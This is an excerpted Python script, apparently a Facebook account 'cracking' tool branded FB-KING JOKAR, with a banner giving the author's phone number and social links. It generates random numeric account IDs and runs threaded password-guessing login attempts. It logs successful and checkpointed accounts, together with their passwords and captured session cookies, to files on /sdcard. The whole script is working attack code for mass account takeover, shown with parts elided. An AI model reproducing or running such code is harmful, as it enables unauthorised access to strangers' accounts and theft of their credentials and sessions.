...
redmi=[]
try:
 print('\033[32;1mFB-KING JOKAR-Success')
...
def banner():
  ...
  \033[91;1m  ╔════════════════════════════════════════╗
   {H} ║{P}[{H}•{P}] Author    :{warna} FB-KING JOKAR           {N}{H}║
  {H}  ║{P}[{H}•{P}] Facebook  : {H}JOK4R SOJIB             {N}{H}║
    {H}║{P}[{H}•{P}] Whatsapp  : {M}01609859866             {N}{H}║
  {H}  ║{P}[{H}•{P}] Github    : {K}github.com/JOK4R- {N}    {H}  ║
 ...
 {K}[{H}√{K}]{P}       {H} The JOK4R-SOJIB  Is BACK 
...
def mainx():
    ...
    print(f'{K} [{H}7{K}] {N}Contact WHASTAPP')
    print(f'{K} [{H}8{K}] {N}Contract FB-KING JOKAR')
    ...
    if mahin in ["1","01"]:
     ...
     os.system("xdg-open https://wa.me/01609859866");mainx()
    elif mahin in ["8","08"]:
     os.system("xdg-open https://www.facebook.com/profile.php?id=100078180585996?mibextid=ZbWKwL");mainx()
    elif mahin in ["0","00"]:
     print(f'{gen}{RED}Exited {H}FB-jokar {P}Terminal ');os.system("xdg-open https://www.facebook.com/profile.php?id=100078180585996?mibextid=ZbWKwL");time.sleep(3);os.system('xdg-open https://www.facebook.com/profile.php?id=100078180585996');exit()
    else:
     print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/profile.php?id=100078180585996?mibextid=ZbWKwL");mainx()
def mainx2():
    os.system("clear")
    banner()
...
def sep():
    ...
    print(led);print(f'{dot}Total File Ids {M}:{H} ' +
          str(len(open(file_name).read().splitlines())));print(led);print(f'{gen}Example {M}:{H} /sdcard/Jokar.txt');print(led)
...
def dupcutter():
    os.system('clear');banner();print(f'{dot}Example   {RED}:{H} /sdcard/jokar.txt');print(led)
    Error = input(f"{wt}{N}File Name {RED}:{H} ");print(led);print(f'{dot}Example   {RED}:{H} /sdcard/Jokar.txt');print(led)
...
def gf1(): 
    ...
    for nmbr in range(limit):
        ...
        idf.append(nmp)
    with tred(max_workers=40) as jokar_xd:
        os.system('clear')
        idx = str(len(idf))
        tk = first+last
        ...
        for number in idf:
            ...
            if mthd in ['1','01']:jokar_xd.submit(m1,idf,pwv)
            elif mthd in ['2','02']:jokar_xd.submit(m2,idf,pwv)
            elif mthd in ['3','03']:jokar_xd.submit(m3,idf,pwv)
            elif mthd in ['4','04']:jokar_xd.submit(m4,idf,pwv)
            elif mthd in ['5','05']:jokar_xd.submit(f1,idf,pwv)
            elif mthd in ['6','06']:jokar_xd.submit(f1,idf,pwv)
            else:
               jokar_xd.submit(m5,idf,pwv)
...
def x8():
  ...
  for nmbr in range(limit):
    ...
    nmp = ''.join(random.choice(string.digits) for _ in range(4))
    user.append(nmp)
  with tred(max_workers=30) as jokar_xd:
    os.system('clear')
    tl = str(len(user))
    ...
    for guru in user:
      ...
      if hc in ['1','01']:jokar_xd.submit(m1,idf,pwv)
      elif hc in ['2','02']:jokar_xd.submit(t1,idf,pwv)
      elif hc in ['3','03']:jokar_xd.submit(m3,idf,pwv)
      elif hc in ['4','04']:jokar_xd.submit(m4,idf,pwv)
      elif hc in ['5','05']:jokar_xd.submit(f1,idf,pwv)
      elif hc in ['6','06']:jokar_xd.submit(f1,idf,pwv)
      else:
       jokar_xd.submit(main,idf,pwv)
...
def x7():
  ...
  with tred(max_workers=30) as jokar_xd:
    ...
    for guru in user:
      ...
      if hc in ['1','01']:jokar_xd.submit(m3,idf,pwv)
      elif hc in ['2','02']:jokar_xd.submit(t1,idf,pwv)
      elif hc in ['3','03']:jokar_xd.submit(m3,idf,pwv)
      elif hc in ['4','04']:jokar_xd.submit(m4,idf,pwv)
      elif hc in ['5','05']:jokar_xd.submit(f1,idf,pwv)
  ...
  input(f'{dot}Press Enter To Go Menu');os.system('python FB-jokar.py')
...
def x6():
  ...
  with tred(max_workers=30) as jokar_xd:
    ...
    for guru in user: 
      ...
      if hc in ['1','01']:jokar_xd.submit(m33,idf,pwv)
      elif hc in ['2','02']:jokar_xd.submit(m2,idf,pwv)
      elif hc in ['3','03']:jokar_xd.submit(m3,idf,pwv)
      elif hc in ['4','04']:jokar_xd.submit(m4,idf,pwv)
      elif hc in ['5','05']:jokar_xd.submit(f1,idf,pwv)
      elif hc in ['6','06']:jokar_xd.submit(f1,idf,pwv)
  ...
  with tred(max_workers=30) as jokar_xd:
    ...
    for guru in user:
     ...
     # pwv = [idf,guru,idf[:6],idf[:7],guru[1:]] #,'@#@#@#','bangladesh'] #,'@#@#@#','bangladesh','free fire','i love you']
      if 'm1' in mtd:jokar_xd.submit(f1,idf,pwv)
      elif 'm2' in mtd:jokar_xd.submit(m2,idf,pwv)
      elif 'm3' in mtd:jokar_xd.submit(m3,idf,pwv)
      elif 'm4' in mtd:jokar_xd.submit(m4,idf,pwv)
      elif 'a1' in mtd:jokar_xd.submit(f1,idf,pwv)
      elif 'f1' in mtd:jokar_xd.submit(f1,idf,pwv)
      else:
       jokar_xd.submit(m5,idf,pwv)
  print('');print(f'{N} Hi Dear User Crack process has been completed')
  input(f'{dot}Press Enter To Go Menu');os.system('python FB-JOKAR.py')
...
def m1(idf,pwv):
    global loop, ok, cp
    animasi = random.choice(["\x1b[1;91mJOK4R","\x1b[1;92mJOK4R","\x1b[1;93mJOK4R","\x1b[1;94mJOK4R","\x1b[1;95mJOK4R","\x1b[1;96mJOK4R","\x1b[1;97mJOK4R","\x1b[1;91mJOK4R","\x1b[1;92mJOK4R","\x1b[1;93mJOK4R","\x1b[1;94mJOK4R","\x1b[1;95mJOK4R","\x1b[1;96mJOK4R"])
        ...
        try:
           ...
           'sec-ch-ua-mobile': '?0'})
            ...
            if "checkpoint" in session.cookies.get_dict().keys():
             ...
             cp+=1
             if 'y' in cp_xdx:
              print(f'\r{P} [\033[1;30mJOK4R-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
             open(' /sdcard/JOK4R-SOJIB-CP.txt', 'a').write(idf+'|'+pw)
             cp.append(idf)
             break
                ...
                ok+=1
                print(f'\r{P} [{H}JOK4R-OK{P}] {GREEN}{idf}|{pw}{xxx}')
                if 'y' in cokix:
                 print(f'\r{gen}{H}'+kukis)
                open(' /sdcard/JOK4R-SOJIB-OK.txt', 'a').write(idf+'|'+pw)
                ok.append(idf+'|'+pw)
                break
            else:
                continue
...
def m4(idx,pwv):
 ...
 # gif = random.choice(["\x1b[1;91m•    ","\x1b[1;92m••   ","\x1b[1;93m•••  ","\x1b[1;94m•••• ","\x1b[1;95m•••••"])
  animasi = random.choice(["\x1b[1;91mJOKAR","\x1b[1;92mJOKAR","\x1b[1;93mJOKAR","\x1b[1;94mJOKAR","\x1b[1;95mJOKAR","\x1b[1;96mJOKAR","\x1b[1;97mJOKAR","\x1b[1;91mJOKAR","\x1b[1;92mJOKAR","\x1b[1;93mJOKAR","\x1b[1;94mJOKAR","\x1b[1;95mJOKAR","\x1b[1;96mJOKAR"])
  ...
  for pw in pwv:
    try:
      ...
      if "checkpoint" in po.cookies.get_dict().keys():
        ...
        if 'y' in cp_xdx:
         print(f'\r{P} [\033[1;30mJOK4R-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
        open(' /sdcard/JOK4R-SOJIB-CP.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        cp+=1
        break
      elif "c_user" in ses.cookies.get_dict().keys():
        ok+=1
        ...
        if 'y' in cokix:
         print(f'\r{gen}{H}'+kuki)
        open(' /sdcard/JOK4R-SOJIB-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        break
...
def m3(idf,pw):
 ...
 global ok
 global agents
 animasi = random.choice(["\x1b[1;91mJOKAR","\x1b[1;92mJOKAR","\x1b[1;93mJOKAR","\x1b[1;94mJOKAR","\x1b[1;95mJOKAR","\x1b[1;96mJOKAR","\x1b[1;97mJOKAR","\x1b[1;91mJOKAR","\x1b[1;92JOKAR","\x1b[1;93mJOKAR","\x1b[1;94mjJOKAR","\x1b[1;95mJOKAR","\x1b[1;96mJOKAR"])
 ...
 try:
  for ps in pw:
   ...
   if 'c_user' in log_cookies:
    ...
    print('\r\033[1;32m [JOK4R-OK] '+user+'|'+ps) #+'--'+coki)
    if 'y' in cokix:
     print(f'\r{gen}{H}'+coki)
    ok+=1 
    open(' /sdcard/JOK4R-OK.txt','a').write(user+'|'+ps+'|'+'\n')
    ok.append(user)
    break
    ...
    uid = "1000"+coki1[0:11]
    if 'y' in cp_xdx:
     print(f'\r{P} [\033[1;30mJOK4R-CP{P}] \033[1;30m{idf}|{ps}{xxx}')
    open(' /sdcard/JOK4R-SOJIB-CP.txt','a').write(idf+'|'+ps+'|'+'\n')
    cp.append(idf)
   else:
    continue
  loop+=1
  ...
  for ps in pw:
   ...
   if 'c_user' in log_cookies:
    ...
    if 'y' in cokix:
     print(f'\r{gen}{H}'+coki)
    ok+=1 
    open(' /sdcard/JOK4R-SOJIB-OK.txt','a').write(user+'|'+ps+'|'+'\n')
    ok.append(user)
    break
   elif 'checkpoint' in log_cookies:
    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
